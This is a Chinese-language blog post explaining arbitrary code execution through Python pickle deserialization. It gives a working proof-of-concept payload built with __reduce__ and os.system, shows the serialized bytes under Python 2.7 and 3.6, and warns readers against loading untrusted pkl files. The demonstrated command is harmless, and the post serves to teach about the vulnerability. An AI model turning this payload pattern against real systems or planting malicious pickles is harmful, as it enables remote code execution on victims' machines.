---
layout: post
title: Python Pickle任意代码执行漏洞
category : python
tags : [python, Pickle]
stickie: true
date: 2018-02-21 00:00:00
---

我们通常使用pickle将python对象序列化，但是pickle在加载时有一个副作用就是它会自动加载相应模块并构造实例对象。这样就造成了一个很危险的代码，如果被黑客利用的话会造成非常严重的后果。

我首先在python2.7下测试，通过如下代码生成`payload`

```python
import pickle
import os
class gen(object):
    def __reduce__(self):
        s = """echo test > payload.txt""" 
        return os.system, (s,)        

p = gen()
payload = pickle.dumps(p)
with open('payload.pkl', 'wb') as f:
    f.write(payload)
```

输出的`payload`是这样的

```python
cnt
system
p1
(S'echo test > payload.txt'
p2
tRp3
.
```

我们通过如下代码去执行`payload`

```python
import pickle
pickle.load(open('./payload.pkl'))
```

通过执行上面这个代码，我们在相同文件夹下生成了`payload.txt`文件，并且内容是`test`。

接着我们将上面的测试放到python3.6下面，通过和python2.7下面相同的代码生成payload

```python
€cnt
system
q X   echo test > payload.txtq卶Rq.
```

我们通过如下代码去执行`payload`

```python
import pickle
pickle.load(open('./payload.pkl', 'rb'))
```

通过执行上面这个代码，我们得到了和python2.7下面相同的结果。

也就是说，只要在我们编写的代码中有打开`pkl`文件操作的代码存在的话，那么都会出现上述的问题。你可以想象到，这是多么危险的一件事情。所以这就要求我们在编写，不要随便打开不知名的`pkl`文件。